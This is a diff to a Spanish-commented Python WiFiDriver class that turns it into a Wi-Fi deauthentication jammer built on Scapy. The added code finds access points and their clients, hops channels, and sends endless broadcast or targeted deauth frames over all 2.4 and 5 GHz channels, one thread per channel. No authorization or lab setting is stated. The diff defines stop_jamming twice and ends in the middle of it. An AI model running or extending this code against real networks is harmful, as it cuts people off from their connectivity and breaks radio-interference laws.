@@ -16,7 +16,7 @@ from dataclasses import dataclass
 
 try:
     from scapy.all import *
-    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeReq, Dot11ProbeResp, RadioTap, Dot11Elt
+    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeReq, Dot11ProbeResp, RadioTap, Dot11Elt, Dot11Deauth
     SCAPY_AVAILABLE = True
 except ImportError:
     SCAPY_AVAILABLE = False
@@ -125,6 +125,11 @@ class WiFiDriver:
         # Redes WiFi detectadas
         self.networks: Dict[str, WiFiNetwork] = {}
         
+        # Listas separadas para clientes-APs y APs (mejora basada en Wi-Fi-Jammer)
+        self.clients_APs = []  # Lista de [cliente_mac, ap_mac, canal, ssid]
+        self.APs = []  # Lista de [bssid, canal, ssid]
+        self.clients_APs_lock = threading.Lock()  # Lock para thread-safety
+        
         # Threading para captura asíncrona
         self.capture_thread = None
         self.capture_active = False
@@ -134,6 +139,15 @@ class WiFiDriver:
         self.jam_all_bands_active = False
         self.jam_thread = None
         self.jam_processes = []  # Lista de procesos de jamming activos
+        self.jam_threads = []  # Lista de threads de jamming
+        self.jamming_active = False  # Flag para jamming con Scapy directo
+        
+        # Channel hopping automático
+        self.channel_hop_active = False
+        self.channel_hop_thread = None
+        self.first_pass = True  # Primera pasada sin jamming (solo identificación)
+        self.channel_hop_lock = threading.Lock()  # Lock para channel hopping
+        self.current_hop_channel = None  # Canal actual en hopping
         
         # Filtros
         self.bssid_filter: Optional[str] = None
@@ -446,6 +460,9 @@ class WiFiDriver:
                         wifi_pkt = self._parse_packet(packet)
                         
                         if wifi_pkt:
+                            # Detectar clientes y APs automáticamente (mejora basada en Wi-Fi-Jammer)
+                            self._detect_clients_and_aps(packet, wifi_pkt)
+                            
                             # Añadir a buffer circular
                             try:
                                 self.packet_queue.put_nowait(wifi_pkt)
@@ -732,6 +749,234 @@ class WiFiDriver:
         """Obtiene el canal actual"""
         return self.current_channel
     
+    def _noise_filter(self, addr1: str, addr2: str, skip_mac: Optional[str] = None) -> bool:
+        """Filtra direcciones MAC problemáticas (mejora basada en Wi-Fi-Jammer)"""
+        if not addr1 or not addr2:
+            return True
+        
+        addr1_lower = addr1.lower()
+        addr2_lower = addr2.lower()
+        
+        # Lista de direcciones a ignorar
+        ignore = [
+            'ff:ff:ff:ff:ff:ff',  # Broadcast
+            '00:00:00:00:00:00',  # Null
+            '33:33:00:',          # IPv6 multicast
+            '33:33:ff:',          # IPv6 multicast
+            '01:80:c2:00:00:00',  # Spanning tree
+            '01:00:5e:',          # IPv4 multicast
+        ]
+        
+        # Agregar MAC del adaptador si está disponible
+        try:
+            interface = self.monitor_interface or self.interface
+            if interface:
+                # Intentar obtener MAC del adaptador
+                result = subprocess.run(['cat', f'/sys/class/net/{interface}/address'], 
+                                      capture_output=True, text=True, timeout=2)
+                if result.returncode == 0:
+                    adapter_mac = result.stdout.strip().lower()
+                    if adapter_mac:
+                        ignore.append(adapter_mac)
+        except:
+            pass
+        
+        # Agregar MAC a saltar si se especifica
+        if skip_mac:
+            ignore.append(skip_mac.lower())
+        
+        # Verificar si alguna dirección está en la lista de ignorar
+        for i in ignore:
+            if i in addr1_lower or i in addr2_lower:
+                return True
+        
+        return False
+    
+    def _detect_clients_and_aps(self, packet, wifi_pkt: WiFiPacket):
+        """Detecta clientes y APs automáticamente (mejora basada en Wi-Fi-Jammer)"""
+        if not packet.haslayer(Dot11):
+            return
+        
+        dot11 = packet[Dot11]
+        if not dot11.addr1 or not dot11.addr2:
+            return
+        
+        addr1 = dot11.addr1.lower()
+        addr2 = dot11.addr2.lower()
+        
+        # Filtrar ruido
+        if self._noise_filter(addr1, addr2):
+            return
+        
+        # Detectar APs (Beacons y Probe Responses)
+        if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
+            self._add_ap(packet, wifi_pkt, dot11)
+        
+        # Detectar clientes (paquetes tipo 1 - Control, tipo 2 - Data)
+        # Estos indican comunicación real entre cliente y AP
+        if dot11.type in [1, 2]:  # Control o Data frames
+            self._add_client_ap_pair(addr1, addr2, wifi_pkt.channel)
+    
+    def _add_ap(self, packet, wifi_pkt: WiFiPacket, dot11):
+        """Agrega un AP a la lista"""
+        bssid = dot11.addr3.lower() if dot11.addr3 else None
+        if not bssid:
+            return
+        
+        ssid = wifi_pkt.ssid or "<hidden>"
+        channel = wifi_pkt.channel
+        
+        # Verificar que el canal sea válido
+        if channel not in self.CHANNELS_2_4 and channel not in self.CHANNELS_5:
+            return
+        
+        with self.clients_APs_lock:
+            # Verificar si el AP ya está en la lista
+            for ap in self.APs:
+                if bssid in ap[0].lower():
+                    return
+            
+            # Agregar nuevo AP
+            self.APs.append([bssid, str(channel), ssid])
+    
+    def _add_client_ap_pair(self, addr1: str, addr2: str, channel: int):
+        """Agrega un par cliente-AP a la lista"""
+        # Verificar que el canal sea válido
+        if channel not in self.CHANNELS_2_4 and channel not in self.CHANNELS_5:
+            return
+        
+        with self.clients_APs_lock:
+            # Si tenemos APs en la lista, verificar si alguna dirección es un AP conocido
+            if len(self.APs) > 0:
+                for ap in self.APs:
+                    ap_bssid = ap[0].lower()
+                    if ap_bssid in addr1.lower() or ap_bssid in addr2.lower():
+                        # Encontrar el AP y el cliente
+                        if ap_bssid in addr1.lower():
+                            client = addr2
+                            ap_mac = addr1
+                        else:
+                            client = addr1
+                            ap_mac = addr2
+                        
+                        # Verificar si el par ya existe
+                        for ca in self.clients_APs:
+                            if client.lower() in ca[0].lower() and ap_mac.lower() in ca[1].lower():
+                                return
+                        
+                        # Agregar nuevo par con SSID si está disponible
+                        ssid = ap[2] if len(ap) > 2 else ""
+                        self.clients_APs.append([client, ap_mac, str(channel), ssid])
+                        return
+            
+            # Si no hay APs conocidos, agregar el par con el canal actual
+            # Verificar si el par ya existe
+            for ca in self.clients_APs:
+                if addr1.lower() in ca[0].lower() and addr2.lower() in ca[1].lower():
+                    return
+                if addr2.lower() in ca[0].lower() and addr1.lower() in ca[1].lower():
+                    return
+            
+            # Agregar nuevo par sin SSID
+            self.clients_APs.append([addr1, addr2, str(channel)])
+    
+    def start_channel_hopping(self, channels: List[int] = None, hop_interval: float = 1.0, 
+                              enable_jamming: bool = False):
+        """Inicia channel hopping automático (mejora basada en Wi-Fi-Jammer)
+        
+        Args:
+            channels: Lista de canales para hacer hopping (None = todos los canales)
+            hop_interval: Tiempo en segundos en cada canal
+            enable_jamming: Si True, hace jamming mientras hace hopping (después de primera pasada)
+        """
+        if self.channel_hop_active:
+            print("Channel hopping ya está activo")
+            return
+        
+        if channels is None:
+            # Usar todos los canales disponibles
+            channels = self.CHANNELS_2_4 + self.CHANNELS_5
+        
+        self.channel_hop_active = True
+        self.first_pass = True
+        self.channel_hop_channels = channels
+        self.channel_hop_interval = hop_interval
+        self.channel_hop_jamming = enable_jamming
+        
+        self.channel_hop_thread = threading.Thread(
+            target=self._channel_hop_loop,
+            daemon=True
+        )
+        self.channel_hop_thread.start()
+        print(f"Channel hopping iniciado en {len(channels)} canales (intervalo: {hop_interval}s)")
+    
+    def stop_channel_hopping(self):
+        """Detiene el channel hopping automático"""
+        if not self.channel_hop_active:
+            return
+        
+        self.channel_hop_active = False
+        if self.channel_hop_thread:
+            self.channel_hop_thread.join(timeout=2)
+        print("Channel hopping detenido")
+    
+    def _channel_hop_loop(self):
+        """Loop de channel hopping automático"""
+        channel_index = 0
+        max_channels = len(self.channel_hop_channels)
+        
+        while self.channel_hop_active:
+            try:
+                # Obtener canal actual
+                if channel_index >= max_channels:
+                    channel_index = 0
+                    with self.channel_hop_lock:
+                        self.first_pass = False  # Primera pasada completada
+                
+                channel = self.channel_hop_channels[channel_index]
+                
+                # Cambiar a este canal
+                with self.channel_hop_lock:
+                    self.current_hop_channel = channel
+                
+                if self.set_channel(channel, silent=True):
+                    # Si no es primera pasada y jamming está habilitado, hacer jamming
+                    if not self.first_pass and self.channel_hop_jamming:
+                        # Buscar APs en este canal
+                        target_bssid = None
+                        with self.clients_APs_lock:
+                            for ap in self.APs:
+                                if str(channel) == ap[1]:
+                                    target_bssid = ap[0]
+                                    break
+                        
+                        if target_bssid:
+                            # Enviar algunos paquetes deauth
+                            try:
+                                deauth_pkt = RadioTap() / Dot11(
+                                    addr1='ff:ff:ff:ff:ff:ff',
+                                    addr2=target_bssid.lower(),
+                                    addr3=target_bssid.lower()
+                                ) / Dot11Deauth()
+                                
+                                interface = self.monitor_interface or self.interface
+                                if interface:
+                                    sendp(deauth_pkt, iface=interface, count=5, inter=0.1, verbose=False)
+                            except:
+                                pass
+                    
+                    # Esperar el intervalo especificado
+                    time.sleep(self.channel_hop_interval)
+                else:
+                    # Si falla cambiar canal, esperar un poco menos
+                    time.sleep(self.channel_hop_interval * 0.5)
+                
+                channel_index += 1
+                
+            except Exception as e:
+                time.sleep(0.5)
+                continue
+    
     def get_statistics(self) -> Dict:
         """Obtiene estadísticas de tráfico"""
         elapsed = time.time() - self.start_time
@@ -998,12 +1243,154 @@ class WiFiDriver:
             print(f"ERROR exportando PCAP: {e}")
             return False
     
-    def start_jamming(self, target_bssid: Optional[str] = None, channel: Optional[int] = None, 
-                     jam_mode: str = "channel") -> bool:
-        """Inicia jamming WiFi usando aireplay-ng con mejor manejo
+    def _send_deauth_packets(self, target_bssid: str, client_mac: Optional[str] = None, 
+                            interface: str = None, count: int = 0, inter: float = 0.1) -> bool:
+        """Envía paquetes de deautenticación usando Scapy directamente (mejora basada en Wi-Fi-Jammer)
         
         Args:
-            target_bssid: BSSID objetivo (None = broadcast)
+            target_bssid: BSSID del AP objetivo
+            client_mac: MAC del cliente (None = broadcast)
+            interface: Interfaz a usar
+            count: Número de paquetes (0 = infinito)
+            inter: Intervalo entre paquetes en segundos
+        """
+        if not SCAPY_AVAILABLE:
+            print("ERROR: scapy no está disponible")
+            return False
+        
+        if not interface:
+            interface = self.monitor_interface or self.interface
+        
+        if not interface:
+            return False
+        
+        try:
+            pkts = []
+            
+            if client_mac:
+                # Deauth dirigido: cliente -> AP y AP -> cliente
+                deauth_pkt1 = RadioTap() / Dot11(
+                    addr1=client_mac.lower(),  # Destino: cliente
+                    addr2=target_bssid.lower(),  # Fuente: AP
+                    addr3=target_bssid.lower()  # BSSID: AP
+                ) / Dot11Deauth()
+                
+                deauth_pkt2 = RadioTap() / Dot11(
+                    addr1=target_bssid.lower(),  # Destino: AP
+                    addr2=client_mac.lower(),  # Fuente: cliente
+                    addr3=target_bssid.lower()  # BSSID: AP
+                ) / Dot11Deauth()
+                
+                pkts = [deauth_pkt1, deauth_pkt2]
+            else:
+                # Deauth broadcast: desconectar todos los clientes del AP
+                deauth_pkt = RadioTap() / Dot11(
+                    addr1='ff:ff:ff:ff:ff:ff',  # Broadcast
+                    addr2=target_bssid.lower(),  # Fuente: AP
+                    addr3=target_bssid.lower()  # BSSID: AP
+                ) / Dot11Deauth()
+                
+                pkts = [deauth_pkt]
+            
+            # Enviar paquetes
+            # Si count es 0 (infinito), enviar en loop hasta que jamming_active sea False
+            if count == 0:
+                while self.jamming_active:
+                    for pkt in pkts:
+                        if not self.jamming_active:
+                            break
+                        sendp(pkt, iface=interface, count=1, inter=inter, verbose=False)
+            else:
+                for pkt in pkts:
+                    sendp(pkt, iface=interface, count=count, inter=inter, verbose=False)
+            
+            return True
+        
+        except Exception as e:
+            print(f"ERROR enviando paquetes deauth: {e}")
+            return False
+    
+    def _jam_channel_loop(self, channel: int, target_bssid: Optional[str] = None, 
+                         client_mac: Optional[str] = None):
+        """Loop de jamming en un canal específico usando Scapy directo"""
+        interface = self.monitor_interface or self.interface
+        if not interface:
+            return
+        
+        problematic_channels = [52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144]
+        
+        while self.jamming_active:
+            try:
+                # Cambiar a este canal
+                if not self.set_channel(channel, silent=True):
+                    if channel in problematic_channels:
+                        time.sleep(2)
+                    else:
+                        time.sleep(0.5)
+                    continue
+                
+                time.sleep(0.2)  # Pausa después de cambiar canal
+                
+                # Determinar BSSID objetivo
+                actual_bssid = target_bssid
+                if not actual_bssid:
+                    # Buscar APs en este canal
+                    with self.clients_APs_lock:
+                        for ap in self.APs:
+                            if str(channel) == ap[1]:  # Canal coincide
+                                actual_bssid = ap[0]
+                                break
+                    
+                    # Si no hay APs conocidos, usar broadcast
+                    if not actual_bssid:
+                        actual_bssid = 'ff:ff:ff:ff:ff:ff'
+                
+                # Enviar paquetes deauth continuamente en loop
+                while self.jamming_active:
+                    try:
+                        # Construir paquetes
+                        pkts = []
+                        if client_mac:
+                            deauth_pkt1 = RadioTap() / Dot11(
+                                addr1=client_mac.lower(),
+                                addr2=actual_bssid.lower(),
+                                addr3=actual_bssid.lower()
+                            ) / Dot11Deauth()
+                            deauth_pkt2 = RadioTap() / Dot11(
+                                addr1=actual_bssid.lower(),
+                                addr2=client_mac.lower(),
+                                addr3=actual_bssid.lower()
+                            ) / Dot11Deauth()
+                            pkts = [deauth_pkt1, deauth_pkt2]
+                        else:
+                            deauth_pkt = RadioTap() / Dot11(
+                                addr1='ff:ff:ff:ff:ff:ff',
+                                addr2=actual_bssid.lower(),
+                                addr3=actual_bssid.lower()
+                            ) / Dot11Deauth()
+                            pkts = [deauth_pkt]
+                        
+                        # Enviar paquetes
+                        for pkt in pkts:
+                            if not self.jamming_active:
+                                break
+                            sendp(pkt, iface=interface, count=1, inter=0.05, verbose=False)
+                        
+                        time.sleep(0.05)  # Pausa entre ciclos
+                    except Exception as e:
+                        time.sleep(0.1)
+                        continue
+            
+            except Exception as e:
+                time.sleep(1)
+                continue
+    
+    def start_jamming(self, target_bssid: Optional[str] = None, channel: Optional[int] = None, 
+                     jam_mode: str = "channel") -> bool:
+        """Inicia jamming WiFi usando Scapy directamente (mejora basada en Wi-Fi-Jammer)
+        
+        Args:
+            target_bssid: BSSID objetivo (None = auto-detectar o broadcast)
             channel: Canal específico (None = canal actual, solo para jam_mode="channel")
             jam_mode: Modo de jamming:
                 - "channel": Canal específico (2.4 o 5 GHz)
@@ -1011,9 +1398,8 @@ class WiFiDriver:
                 - "band_5": Todos los canales 5 GHz (36-165)
                 - "all": Todos los canales en ambas bandas (2.4 y 5 GHz)
         """
-        # Verificar que aireplay-ng esté disponible
-        if not self._check_command_available('aireplay-ng'):
-            print("ERROR: aireplay-ng no está instalado. Instala con: sudo apt install aircrack-ng")
+        if not SCAPY_AVAILABLE:
+            print("ERROR: scapy no está disponible. Instala con: pip install scapy")
             return False
         
         try:
@@ -1021,8 +1407,11 @@ class WiFiDriver:
             if not interface:
                 return False
             
+            # Detener cualquier jamming activo antes de iniciar uno nuevo
+            self.stop_jamming()
+            
             if jam_mode == "channel":
-                # Jamming en canal específico (comportamiento original)
+                # Jamming en canal específico usando Scapy directo
                 if channel:
                     self.set_channel(channel)
                 
@@ -1037,282 +1426,69 @@ class WiFiDriver:
                 actual_bssid = target_bssid
                 if not actual_bssid:
                     print(f"Buscando APs en canal {self.current_channel}...")
-                    # Usar aireplay-ng --test para encontrar APs rápidamente
-                    import os
-                    if hasattr(os, 'geteuid') and os.geteuid() == 0:
-                        test_cmd = ['aireplay-ng', '--test', interface]
-                    else:
-                        test_cmd = ['sudo', 'aireplay-ng', '--test', interface]
-                    
-                    try:
-                        test_result = subprocess.run(
-                            test_cmd,
-                            stdout=subprocess.PIPE,
-                            stderr=subprocess.PIPE,
-                            timeout=5,
-                            universal_newlines=True
-                        )
-                        
-                        # Parsear salida para encontrar BSSIDs
-                        output = test_result.stdout + test_result.stderr
-                        bssids_found = []
-                        for line in output.split('\n'):
-                            # Buscar líneas con formato: "BSSID - channel: X - 'SSID'"
-                            if 'channel:' in line and ' - ' in line:
-                                parts = line.split(' - ')
-                                if len(parts) >= 1:
-                                    bssid_part = parts[0].strip()
-                                    # Verificar que sea un BSSID válido (formato MAC)
-                                    if ':' in bssid_part and len(bssid_part.split(':')) == 6:
-                                        # Extraer canal
-                                        channel_part = None
-                                        for p in parts:
-                                            if 'channel:' in p:
-                                                channel_part = p
-                                                break
-                                        
-                                        if channel_part:
-                                            try:
-                                                ch_num = int(channel_part.split(':')[1].strip().split()[0])
-                                                # Solo usar APs en el canal actual
-                                                if ch_num == self.current_channel:
-                                                    bssids_found.append(bssid_part)
-                                            except:
-                                                pass
-                        
-                        if bssids_found:
-                            actual_bssid = bssids_found[0]  # Usar el primer AP encontrado
-                            print(f"AP encontrado: {actual_bssid} (canal {self.current_channel})")
-                            if len(bssids_found) > 1:
-                                print(f"Nota: Se encontraron {len(bssids_found)} APs. Usando: {actual_bssid}")
-                        else:
-                            print(f"ERROR: No se encontraron APs en el canal {self.current_channel}")
-                            print("Sugerencias:")
-                            print("  1. Usa 'wifiscan' para ver todas las redes disponibles")
-                            print("  2. Especifica un BSSID manualmente: jam <canal> <BSSID>")
-                            print("  3. Cambia a un canal con tráfico: setchannel <canal>")
-                            return False
-                    except subprocess.TimeoutExpired:
-                        print("ERROR: Timeout buscando APs")
-                        return False
-                    except Exception as e:
-                        print(f"ERROR buscando APs: {e}")
-                        print("Intenta especificar un BSSID manualmente: jam <canal> <BSSID>")
-                        return False
-                
-                # Usar aireplay-ng para deauth attack
-                # Nota: Si ya estamos ejecutando con sudo, no necesitamos sudo en el comando
-                import os
-                if hasattr(os, 'geteuid') and os.geteuid() == 0:
-                    # Ya estamos como root, no usar sudo
-                    cmd = ['aireplay-ng', '--deauth', '0', '-a', actual_bssid, interface]
-                else:
-                    # Necesitamos sudo
-                    cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', actual_bssid, interface]
-                
-                print(f"Iniciando jamming en {interface}...")
-                print(f"Comando: {' '.join(cmd)}")
-                
-                # Verificar primero que la interfaz esté en modo monitor
-                if not self.monitor_mode:
-                    print("ERROR: La interfaz no está en modo monitor.")
-                    return False
-                
-                # Verificar que la interfaz monitor existe
-                monitor_iface = self.monitor_interface or interface
-                if not monitor_iface:
-                    print("ERROR: No se pudo determinar la interfaz monitor.")
-                    return False
-                
-                # Ejecutar en background con mejor manejo
-                try:
-                    # Usar stderr=subprocess.PIPE separado para capturar errores
-                    self.jam_process = subprocess.Popen(
-                        cmd, 
-                        stdout=subprocess.PIPE, 
-                        stderr=subprocess.PIPE,
-                        universal_newlines=False,  # Mantener bytes para mejor compatibilidad
-                        bufsize=0  # Sin buffer para leer inmediatamente
-                    )
-                except Exception as e:
-                    print(f"ERROR ejecutando aireplay-ng: {e}")
-                    return False
-                
-                # Leer salida inmediatamente para capturar errores
-                import select
-                import fcntl
-                error_output = b""
-                start_time = time.time()
-                max_wait = 1.5  # Esperar máximo 1.5 segundos
-                
-                # Hacer stdout no bloqueante
-                try:
-                    if hasattr(fcntl, 'F_SETFL'):
-                        flags = fcntl.fcntl(self.jam_process.stdout.fileno(), fcntl.F_GETFL)
-                        fcntl.fcntl(self.jam_process.stdout.fileno(), fcntl.F_SETFL, flags | os.O_NONBLOCK)
-                        flags = fcntl.fcntl(self.jam_process.stderr.fileno(), fcntl.F_GETFL)
-                        fcntl.fcntl(self.jam_process.stderr.fileno(), fcntl.F_SETFL, flags | os.O_NONBLOCK)
-                except:
-                    pass
-                
-                # Leer salida mientras el proceso está corriendo
-                while time.time() - start_time < max_wait:
-                    if self.jam_process.poll() is not None:
-                        # Proceso terminó, leer toda la salida restante
-                        try:
-                            remaining_stdout = self.jam_process.stdout.read()
-                            remaining_stderr = self.jam_process.stderr.read()
-                            if remaining_stdout:
-                                error_output += remaining_stdout
-                            if remaining_stderr:
-                                error_output += remaining_stderr
-                        except:
-                            pass
-                        break
-                    
-                    # Intentar leer datos disponibles
-                    try:
-                        if hasattr(select, 'select'):
-                            ready_stdout, ready_stderr = [], []
-                            try:
-                                ready_stdout, _, _ = select.select([self.jam_process.stdout], [], [], 0.1)
-                            except:
-                                pass
-                            try:
-                                ready_stderr, _, _ = select.select([self.jam_process.stderr], [], [], 0.0)
-                            except:
-                                pass
-                            
-                            if ready_stdout:
-                                try:
-                                    data = self.jam_process.stdout.read(4096)
-                                    if data:
-                                        error_output += data
-                                except:
-                                    pass
-                            
-                            if ready_stderr:
-                                try:
-                                    data = self.jam_process.stderr.read(4096)
-                                    if data:
-                                        error_output += data
-                                except:
-                                    pass
-                        else:
-                            # Sin select, esperar un poco y verificar
-                            time.sleep(0.2)
-                            if self.jam_process.poll() is not None:
+                    # Buscar en la lista de APs detectados
+                    with self.clients_APs_lock:
+                        for ap in self.APs:
+                            if str(self.current_channel) == ap[1]:  # Canal coincide
+                                actual_bssid = ap[0]
+                                print(f"AP encontrado: {actual_bssid} (canal {self.current_channel}, SSID: {ap[2]})")
                                 break
-                    except:
-                        time.sleep(0.1)
+                    
+                    # Si no hay APs conocidos, usar broadcast
+                    if not actual_bssid:
+                        actual_bssid = 'ff:ff:ff:ff:ff:ff'
+                        print(f"Usando broadcast (no se encontraron APs en canal {self.current_channel})")
                 
-                # Si el proceso terminó, leer toda la salida restante
-                if self.jam_process.poll() is not None:
-                    try:
-                        remaining_stdout, remaining_stderr = self.jam_process.communicate(timeout=0.5)
-                        if remaining_stdout:
-                            error_output += remaining_stdout
-                        if remaining_stderr:
-                            error_output += remaining_stderr
-                    except:
-                        pass
+                # Iniciar jamming con Scapy directo en thread separado
+                self.jamming_active = True
+                self.jam_thread = threading.Thread(
+                    target=self._jam_channel_loop,
+                    args=(self.current_channel, actual_bssid, None),
+                    daemon=True
+                )
+                self.jam_thread.start()
                 
-                # Verificar si el proceso terminó
-                if self.jam_process.poll() is not None:
-                    # Proceso terminó prematuramente
-                    returncode = self.jam_process.returncode
-                    output = ''.join(error_lines) if error_lines else ""
-                    
-                    # Intentar leer cualquier salida restante
-                    try:
-                        remaining = self.jam_process.stdout.read()
-                        if remaining:
-                            output += remaining
-                    except:
-                        pass
-                    
-                    print(f"\n{'='*60}")
-                    print(f"ERROR: aireplay-ng terminó inmediatamente")
-                    print(f"Código de salida: {returncode}")
-                    print(f"{'='*60}")
-                    
-                    # Decodificar salida
-                    try:
-                        output_text = error_output.decode('utf-8', errors='replace')
-                    except:
-                        output_text = str(error_output)
-                    
-                    if output_text.strip():
-                        print(f"\nSalida de aireplay-ng:\n{output_text}")
-                    else:
-                        print("\nNo se capturó salida de aireplay-ng")
-                        print("Esto puede indicar que el proceso falló antes de escribir salida.")
-                    
-                    # Diagnóstico adicional
-                    print(f"\n{'='*60}")
-                    print(f"DIAGNÓSTICO:")
-                    print(f"  - Interfaz: {interface}")
-                    print(f"  - Modo monitor: {self.monitor_mode}")
-                    print(f"  - Monitor interface: {self.monitor_interface}")
-                    print(f"  - Canal actual: {self.current_channel}")
-                    print(f"  - BSSID objetivo: {target_bssid or 'Broadcast (FF:FF:FF:FF:FF:FF)'}")
-                    print(f"\nPRUEBAS MANUALES:")
-                    print(f"  1. Verificar inyección:")
-                    print(f"     sudo aireplay-ng --test {interface}")
-                    print(f"  2. Probar deauth manual (5 paquetes):")
-                    print(f"     sudo aireplay-ng --deauth 5 -a {target_bssid or 'FF:FF:FF:FF:FF:FF'} {interface}")
-                    print(f"  3. Verificar modo monitor:")
-                    print(f"     iwconfig {interface}")
-                    print(f"  4. Verificar que la interfaz existe:")
-                    print(f"     ip link show {interface}")
-                    print(f"{'='*60}\n")
-                    
-                    # Limpiar proceso zombie
-                    try:
-                        self.jam_process.wait(timeout=0.5)
-                    except:
-                        try:
-                            self.jam_process.kill()
-                            self.jam_process.wait(timeout=0.5)
-                        except:
-                            pass
-                    
-                    self.jam_process = None
-                    return False
-                
-                # Proceso está corriendo
-                print(f"\n✓ Jamming iniciado correctamente")
-                print(f"  PID: {self.jam_process.pid}")
+                print(f"\n✓ Jamming iniciado correctamente (Scapy directo)")
                 print(f"  Interfaz: {interface}")
                 print(f"  Canal: {self.current_channel}")
-                print(f"  BSSID: {target_bssid or 'Broadcast'}")
-                print(f"\nPara verificar: ps aux | grep {self.jam_process.pid}")
-                print(f"Para detener: jam (de nuevo) o x\n")
+                print(f"  BSSID: {actual_bssid}")
+                print(f"\nPara detener: jam (de nuevo) o x\n")
                 
                 return True
             
             else:
-                # Jamming en múltiples canales - usar múltiples threads para saturar todos los canales simultáneamente
+                # Jamming en múltiples canales usando Scapy directo
+                self.jamming_active = True
                 self.jam_all_bands_active = True
-                self.jam_process = None  # No usamos proceso único
                 
                 # Determinar canales a usar
                 if jam_mode == "band_2_4":
                     channels_to_jam = self.CHANNELS_2_4
+                    print(f"Iniciando jamming en banda 2.4 GHz ({len(channels_to_jam)} canales)...")
                 elif jam_mode == "band_5":
                     channels_to_jam = self.CHANNELS_5
+                    print(f"Iniciando jamming en banda 5 GHz ({len(channels_to_jam)} canales)...")
                 elif jam_mode == "all":
                     channels_to_jam = self.CHANNELS_2_4 + self.CHANNELS_5
+                    print(f"Iniciando jamming en todas las bandas ({len(channels_to_jam)} canales)...")
                 else:
                     channels_to_jam = [self.current_channel]
                 
                 # Crear un thread por cada canal para saturación simultánea
                 self.jam_threads = []
                 for channel in channels_to_jam:
-                    thread = threading.Thread(target=self._jam_single_channel_loop, 
-                                            args=(channel, target_bssid), daemon=True)
+                    thread = threading.Thread(
+                        target=self._jam_channel_loop,
+                        args=(channel, target_bssid, None),
+                        daemon=True
+                    )
                     thread.start()
                     self.jam_threads.append(thread)
+                
+                print(f"✓ Jamming iniciado en {len(channels_to_jam)} canales (Scapy directo)")
+                print(f"  Interfaz: {interface}")
+                print(f"  BSSID: {target_bssid or 'Auto-detectado/Broadcast'}")
+                print(f"\nPara detener: jam (de nuevo) o x\n")
                 
                 return True
         
@@ -1322,84 +1498,6 @@ class WiFiDriver:
         except Exception as e:
             print(f"ERROR iniciando jamming: {e}")
             return False
-    
-    def _jam_single_channel_loop(self, channel: int, target_bssid: Optional[str] = None):
-        """Loop para jamming en un canal específico de forma continua"""
-        interface = self.monitor_interface or self.interface
-        if not interface:
-            return
-        
-        # Canales problemáticos que pueden fallar
-        problematic_channels = [52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144]
-        
-        while getattr(self, 'jam_all_bands_active', False):
-            try:
-                # Intentar cambiar a este canal
-                if not self.set_channel(channel, silent=True):
-                    # Si es un canal problemático, esperar más antes de reintentar
-                    if channel in problematic_channels:
-                        time.sleep(2)
-                    else:
-                        time.sleep(0.5)
-                    continue
-                
-                time.sleep(0.2)  # Pausa después de cambiar canal
-                
-                # Iniciar deauth infinito en este canal
-                cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
-                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                
-                # Verificar que el proceso inició correctamente
-                time.sleep(0.3)
-                if process.poll() is not None:
-                    # Proceso terminó inmediatamente, leer error
-                    stderr = process.stderr.read().decode('utf-8', errors='ignore') if process.stderr else ""
-                    if stderr and "not found" not in stderr.lower():
-                        # Solo mostrar errores importantes (no "interface not found" que es común)
-                        pass
-                    # Reintentar después de un tiempo
-                    time.sleep(1)
-                    continue
-                
-                # Guardar proceso para poder terminarlo después
-                if not hasattr(self, 'jam_processes'):
-                    self.jam_processes = []
-                self.jam_processes.append(process)
-                
-                # Mantener el proceso corriendo mientras el jamming esté activo
-                # Verificar periódicamente si debemos continuar
-                while getattr(self, 'jam_all_bands_active', False):
-                    time.sleep(1)  # Verificar cada segundo
-                    # Verificar si el proceso sigue corriendo
-                    if process.poll() is not None:
-                        # Proceso terminó, leer error y reiniciar
-                        stderr = process.stderr.read().decode('utf-8', errors='ignore') if process.stderr else ""
-                        if stderr:
-                            # El proceso falló, reiniciar
-                            break
-                
-                # Terminar proceso cuando salimos del loop
-                try:
-                    process.terminate()
-                    process.wait(timeout=1)
-                except:
-                    try:
-                        process.kill()
-                        process.wait(timeout=1)
-                    except:
-                        pass
-                
-                # Remover de la lista
-                if hasattr(self, 'jam_processes') and process in self.jam_processes:
-                    self.jam_processes.remove(process)
-                
-                # Pequeña pausa antes de reiniciar
-                time.sleep(0.3)
-                
-            except Exception as e:
-                # Si hay error, esperar un poco antes de reintentar
-                time.sleep(1)
-                continue
     
     def stop_jamming(self):
         """Detiene el jamming con mejor manejo"""
@@ -1431,6 +1529,63 @@ class WiFiDriver:
                         self.jam_process.wait(timeout=1)
                     except:
                         pass
+        except Exception as e:
+            print(f"Advertencia al detener jamming: {e}")
+    
+    def stop_jamming(self):
+        """Detiene el jamming con mejor manejo (actualizado para Scapy directo)"""
+        try:
+            # Detener flag de jamming
+            self.jamming_active = False
+            self.jam_all_bands_active = False
+            
+            # Detener threads de jamming
+            if hasattr(self, 'jam_threads') and self.jam_threads:
+                for thread in self.jam_threads:
+                    if thread and thread.is_alive():
+                        # El thread se detendrá automáticamente cuando jamming_active sea False
+                        pass
+                self.jam_threads = []
+            
+            # Detener thread de jamming único
+            if hasattr(self, 'jam_thread') and self.jam_thread:
+                if self.jam_thread.is_alive():
+                    # El thread se detendrá automáticamente cuando jamming_active sea False
+                    self.jam_thread.join(timeout=2)
+            
+            # Detener procesos antiguos de aireplay-ng (por si acaso)
+            if hasattr(self, 'jam_process') and self.jam_process:
+                try:
+                    self.jam_process.terminate()
+                    try:
+                        self.jam_process.wait(timeout=2)
+                    except subprocess.TimeoutExpired:
+                        self.jam_process.kill()
+                        self.jam_process.wait(timeout=1)
+                except (ProcessLookupError, ValueError):
+                    pass
+                except Exception:
+                    try:
+                        self.jam_process.kill()
+                        self.jam_process.wait(timeout=1)
+                    except:
+                        pass
+                self.jam_process = None
+            
+            # Detener procesos múltiples (por si acaso)
+            if hasattr(self, 'jam_processes') and self.jam_processes:
+                for process in self.jam_processes:
+                    try:
+                        process.terminate()
+                        process.wait(timeout=1)
+                    except:
